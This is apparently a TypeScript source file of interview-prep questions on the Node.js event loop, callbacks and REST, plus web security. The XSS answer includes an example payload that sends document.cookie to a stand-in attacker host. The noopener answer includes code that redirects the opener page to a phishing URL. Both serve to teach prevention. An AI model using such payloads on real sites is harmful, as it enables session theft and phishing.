import { html, http, js, list, output, p, say, table, trap, tsx } from "../interview-prep/blocks";
import type { ReviewSection } from "./types";

export const NODE: ReviewSection = {
  id: "node",
  topic: "node",
  title: "Node.js and APIs",
  blurb: "Node's async conventions, its event loop, and the REST style most front ends talk to.",
  questions: [
    {
      id: "node-event-loop",
      question: "What is the event loop in Node.js?",
      topics: ["node", "javascript"],
      level: "senior",
      short:
        "The loop, provided by libuv, that lets single-threaded JavaScript handle many concurrent operations. JavaScript runs on one thread; I/O is handed to the operating system or libuv's thread pool, and when it completes, its callback is queued. Each turn of the loop runs through phases: **timers** (`setTimeout`), **pending callbacks**, **poll** (I/O callbacks, waiting for new events), **check** (`setImmediate`) and **close callbacks**. After every callback, Node drains the `process.nextTick` queue, then the promise microtask queue.",
      body: [
        js(`
import { readFile } from "node:fs";

readFile("package.json", () => {
  setTimeout(() => console.log("timeout"), 0);
  setImmediate(() => console.log("immediate"));
  process.nextTick(() => console.log("nextTick"));
  Promise.resolve().then(() => console.log("promise"));
  console.log("I/O callback");
});
`),
        output(`
I/O callback
nextTick
promise
immediate
timeout
`),
        p("Inside an I/O callback the loop is in the poll phase, so the check phase (`setImmediate`) comes before the loop wraps round to timers. In the main module the order of `setTimeout(fn, 0)` and `setImmediate` is not guaranteed: it depends on how long the process took to start."),
        table(
          ["Phase", "Runs"],
          ["timers", "expired `setTimeout` / `setInterval` callbacks"],
          ["pending callbacks", "some system-level I/O callbacks deferred from the previous turn"],
          ["poll", "I/O callbacks; waits here for new events when nothing else is scheduled"],
          ["check", "`setImmediate` callbacks"],
          ["close callbacks", "`close` events, such as `socket.on(\"close\")`"],
        ),
        list(
          "**Thread pool**: file system, DNS lookup, `crypto` and `zlib` run on libuv's pool (4 threads by default); network sockets use the OS's non-blocking I/O.",
          "**Blocking the loop** with CPU work (a big `JSON.parse`, a sync hash) stalls every request. Move it to `worker_threads`.",
          "**Recursive `process.nextTick`** can starve the loop: the queue is drained completely before moving on.",
        ),
      ],
      demo: { id: "node-event-loop", hint: "Step the loop around its phases and see when nextTick and promises cut in." },
      goodToHear: ["libuv", "Single JS thread, non-blocking I/O", "The phases in order", "`nextTick` and microtasks between callbacks", "`setImmediate` vs `setTimeout`", "Thread pool and blocking"],
      links: [
        { title: "Node.js: The Node.js event loop", url: "https://nodejs.org/en/learn/asynchronous-work/event-loop-timers-and-nexttick" },
        { title: "Node.js: Don't block the event loop", url: "https://nodejs.org/en/learn/asynchronous-work/dont-block-the-event-loop" },
      ],
    },
    {
      id: "node-error-first-callback",
      question: "NodeJS often uses a callback pattern where if an error is encountered during execution, this error is passed as the first argument to the callback. What are the advantages of this pattern?",
      prompt: [
        js(`
fs.readFile(filePath, function (err, data) {
  if (err) {
    // handle the error; the return is important here
    // so execution stops
    return console.log(err);
  }
  // use the data
  console.log(data);
});
`),
      ],
      topics: ["node", "javascript"],
      level: "intermediate",
      short:
        "An error can't be thrown back to the caller from an asynchronous callback: by the time it runs, the caller's `try/catch` is long gone. Passing it as the first argument makes failure an ordinary value. Because every API follows the same shape (`(err, result)`), handling the error is the first thing you see, success and failure share one callback, and tools such as `util.promisify` can convert any of them to promises mechanically.",
      body: [
        js(`
import { promisify } from "node:util";

function legacyRead(path, callback) {
  setTimeout(() => {
    if (path === "") callback(new Error("empty path"));
    else callback(null, "contents of " + path);
  }, 5);
}

legacyRead("", (error, data) => {
  if (error) return console.log("failed:", error.message);
  console.log(data);
});

const read = promisify(legacyRead);
console.log(await read("notes.txt"));
`),
        output(`
failed: empty path
contents of notes.txt
`),
        list(
          "**Consistency**: one convention across core modules and the ecosystem.",
          "**Explicit handling**: the `if (err) return ...` guard is hard to forget when the error is the first parameter.",
          "**`null` for success**: callers test truthiness, so pass `null`, not `undefined` or `false`.",
          "**Call exactly once**, and never throw from inside the callback-taking function after starting async work: report through the callback.",
        ),
        say("Today I'd use the promise APIs (`node:fs/promises`) with `async`/`await`, and keep error-first callbacks for older libraries, wrapped with `promisify`."),
      ],
      goodToHear: ["Errors can't be thrown across async boundaries", "Consistent `(err, data)` signature", "Error checked first", "`null` on success", "`util.promisify` relies on it"],
      links: [{ title: "Node.js: Error-first callbacks", url: "https://nodejs.org/api/errors.html#error-first-callbacks" }],
    },
    {
      id: "callback-hell",
      question: "How can you avoid callback hells?",
      prompt: [
        js(`
getData(function (a) {
  getMoreData(a, function (b) {
    getMoreData(b, function (c) {
      getMoreData(c, function (d) {
        getMoreData(d, function (e) {
          // ...
        });
      });
    });
  });
});
`),
      ],
      topics: ["node", "javascript"],
      level: "senior",
      short:
        "Use promises and `async`/`await` so dependent steps read top to bottom instead of nesting, with one `try/catch` for all of them. Before promises, the fixes were naming and extracting the callbacks into separate functions and using a control-flow library. Steps that don't depend on each other should run in parallel with `Promise.all`.",
      body: [
        js(`
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const getData = async () => (await wait(5), 1);
const getMoreData = async (n) => (await wait(5), n + 1);

async function pipeline() {
  try {
    const a = await getData();
    const b = await getMoreData(a);
    const c = await getMoreData(b);
    const d = await getMoreData(c);
    return await getMoreData(d);
  } catch (error) {
    console.error("pipeline failed", error);
    throw error;
  }
}
console.log(await pipeline());
`),
        output(`5`),
        list(
          "**Promisify** callback APIs (`util.promisify`, or the promise versions such as `node:fs/promises`).",
          "**Flatten with chaining** if you can't use `async`: `getData().then(getMoreData).then(getMoreData)`.",
          "**Parallelise** independent work: `const [user, orders] = await Promise.all([getUser(), getOrders()])`.",
          "**Extract named functions** for each step; the nesting goes away and each piece is testable.",
        ),
        trap("Callback hell is mostly about error handling: each level needs its own `if (err)` check, and forgetting one swallows the error. That is the strongest argument for promises."),
      ],
      goodToHear: ["Promises and async/await", "Named, modular functions", "`Promise.all` for parallel steps", "`util.promisify`", "Centralised error handling"],
      links: [{ title: "MDN: Using promises (chaining)", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises#chaining" }],
    },
    {
      id: "rest",
      question: "What is REST?",
      topics: ["node"],
      level: "intermediate",
      short:
        "REpresentational State Transfer, an architectural style for networked APIs described by Roy Fielding in 2000. Data is modelled as **resources** identified by URLs (`/posts/42`), and clients act on them with the standard HTTP methods (GET, POST, PUT, PATCH, DELETE), exchanging representations such as JSON. Requests are stateless, responses say whether they can be cached, and status codes report the outcome.",
      body: [
        table(
          ["Action", "Request", "Typical success"],
          ["List posts", "`GET /posts`", "`200 OK`"],
          ["Read one", "`GET /posts/42`", "`200 OK` (`404` if missing)"],
          ["Create", "`POST /posts`", "`201 Created` + `Location: /posts/43`"],
          ["Replace", "`PUT /posts/42`", "`200 OK` or `204 No Content`"],
          ["Update fields", "`PATCH /posts/42`", "`200 OK`"],
          ["Delete", "`DELETE /posts/42`", "`204 No Content`"],
          ["Nested resource", "`GET /posts/42/comments`", "`200 OK`"],
        ),
        http(`
POST /posts HTTP/1.1
Content-Type: application/json

{ "title": "Hello" }

HTTP/1.1 201 Created
Location: /posts/43
Content-Type: application/json

{ "id": 43, "title": "Hello" }
`),
        list(
          "**Nouns in URLs, verbs in methods**: `POST /posts`, not `POST /createPost`.",
          "**Safe and idempotent**: GET changes nothing; GET, PUT and DELETE can be repeated with the same result; POST cannot. That matters for retries.",
          "**Stateless**: every request carries what the server needs (for example an `Authorization` header), which makes servers easy to scale.",
          "**Alternatives**: GraphQL (client chooses the fields, one endpoint), gRPC (binary, typed contracts), tRPC (TypeScript end to end).",
        ),
      ],
      demo: { id: "rest-explorer", hint: "Send requests to a toy `/posts` API and compare methods, status codes and repeat behaviour." },
      goodToHear: ["Resources identified by URLs", "HTTP methods as operations", "Stateless, cacheable", "Status codes", "Idempotency", "Alternatives: GraphQL, gRPC"],
      links: [
        { title: "MDN: HTTP request methods", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods" },
        { title: "Roy Fielding: Architectural Styles (chapter 5, REST)", url: "https://ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm" },
      ],
    },
  ],
};

export const SECURITY: ReviewSection = {
  id: "security",
  topic: "security",
  title: "Web security",
  blurb: "Two attacks every front-end developer should be able to explain, and the defaults that stop them.",
  questions: [
    {
      id: "xss",
      question: "What is a cross-site scripting attack (XSS) and how do you prevent it?",
      topics: ["security", "javascript"],
      level: "intermediate",
      short:
        "XSS is when an attacker gets their script to run in your page, in other users' browsers, with your origin's privileges: it can read the page, act as the user and steal tokens. It happens when untrusted input is inserted into HTML, attributes, URLs or scripts without the right escaping. Prevent it by escaping output (frameworks like React do it by default for text), avoiding raw-HTML APIs, sanitising the HTML you must render, and adding a Content Security Policy.",
      body: [
        js(`
const comment = '<img src=x onerror="fetch(\\'https://evil.example/?c=\\' + document.cookie)">';

element.innerHTML = comment;    // vulnerable: the browser parses it and runs onerror
element.textContent = comment;  // safe: shown as literal text
`),
        tsx(`
function Comment({ text, html }: { text: string; html: string }) {
  return (
    <>
      {/* Text is escaped by React: safe. */}
      <p>{text}</p>
      {/* Raw HTML: only after sanitising it, e.g. with DOMPurify.sanitize(html). */}
      <div dangerouslySetInnerHTML={{ __html: html }} />
    </>
  );
}
`),
        table(
          ["Type", "Where the script comes from"],
          ["Stored", "saved on the server (a comment, a profile) and served to every viewer"],
          ["Reflected", "echoed back from the request (a search term in the URL)"],
          ["DOM-based", "client code writes attacker-controlled data (`location.hash`) into the DOM"],
        ),
        list(
          "**Escape by context**: HTML text, attribute values, URLs and inline scripts each need different encoding. Templating engines and React handle the common cases.",
          "**Dangerous sinks**: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout(string)`, and `href`/`src` attributes holding user-supplied `javascript:` URLs, which escaping doesn't neutralise: validate the scheme.",
          "**Sanitise** required HTML with a maintained library (DOMPurify); never with your own regex.",
          "**Content Security Policy**: `script-src 'self' 'nonce-...'` stops injected inline scripts from running; Trusted Types can lock down DOM sinks.",
          "**Limit the damage**: `HttpOnly` cookies can't be read by scripts.",
        ),
      ],
      demo: { id: "xss-inspector", hint: "Paste a payload and see what the HTML parser would build from it, without anything running." },
      goodToHear: ["Injected script runs with the site's privileges", "Stored, reflected, DOM-based", "Escape output by context", "Avoid `innerHTML` and `eval`; sanitise", "Content Security Policy", "`HttpOnly` cookies"],
      links: [
        { title: "OWASP: Cross Site Scripting Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
        { title: "MDN: Content Security Policy", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" },
      ],
    },
    {
      id: "rel-noopener",
      question: "Where and why is the `rel=\"noopener\"` attribute used?",
      topics: ["html", "security"],
      level: "intermediate",
      short:
        "On links that open in a new tab (`target=\"_blank\"`). Without it, the opened page gets `window.opener`, a reference to your page, and can navigate it, for example to a look-alike login page while the user is looking at the new tab (\"reverse tabnabbing\"). `rel=\"noopener\"` sets `window.opener` to `null`. Modern browsers now apply it by default to `target=\"_blank\"` links, but it is still written explicitly, and needed for `window.open`.",
      body: [
        html(`
<a href="https://other.example" target="_blank" rel="noopener noreferrer">Other site</a>
`),
        js(`
// The attack, from the opened page:
if (window.opener) {
  window.opener.location = "https://phishing.example/login";
}

// Opening a window yourself: pass noopener in the features.
window.open("https://other.example", "_blank", "noopener");
`),
        list(
          "`noreferrer` also omits the `Referer` header, and implies `noopener`.",
          "Browsers changed the default around 2020–2021 (Chrome 88, Firefox 79, Safari 12.1): `target=\"_blank\"` behaves as if `noopener` were set unless you write `rel=\"opener\"`.",
          "A side benefit: without an opener link, the browser can put the new page in a separate process.",
        ),
        trap("`rel=\"noopener\"` protects your page from the one you link to, not the reverse. User-generated links are the risky ones."),
      ],
      goodToHear: ["Links with `target=\"_blank\"`", "`window.opener` access", "Reverse tabnabbing", "`noreferrer` too", "Now the browser default, still worth writing"],
      links: [
        { title: "MDN: rel=noopener", url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel/noopener" },
        { title: "OWASP: Reverse tabnabbing", url: "https://owasp.org/www-community/attacks/Reverse_Tabnabbing" },
      ],
    },
  ],
};
